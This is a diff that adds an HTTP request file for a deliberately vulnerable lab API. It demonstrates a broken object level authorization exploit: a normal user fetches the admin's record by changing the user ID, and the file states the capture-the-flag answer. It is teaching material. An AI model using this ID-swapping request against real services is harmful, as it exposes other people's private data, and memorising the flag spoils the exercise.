@@ -1,0 +1,30 @@
+meta {
+  name: V01 BOLA - Get Admin Data
+  type: http
+  seq: 2
+}
+
+get {
+  url: {{baseUrl}}/api/users/1
+  body: none
+  auth: bearer
+}
+
+auth:bearer {
+  token: {{token}}
+}
+
+docs {
+  # V01: Broken Object Level Authorization (BOLA)
+
+  ## Vulnerability
+  Access another user's data by changing the ID.
+
+  ## Exploit
+  1. Login as john (user ID 2)
+  2. Request /api/users/1 (admin's ID)
+  3. Get admin's sensitive data including flag!
+
+  ## Flag Location
+  admin's secret_note contains: VULNAPI{bola_user_data_exposed}
+}
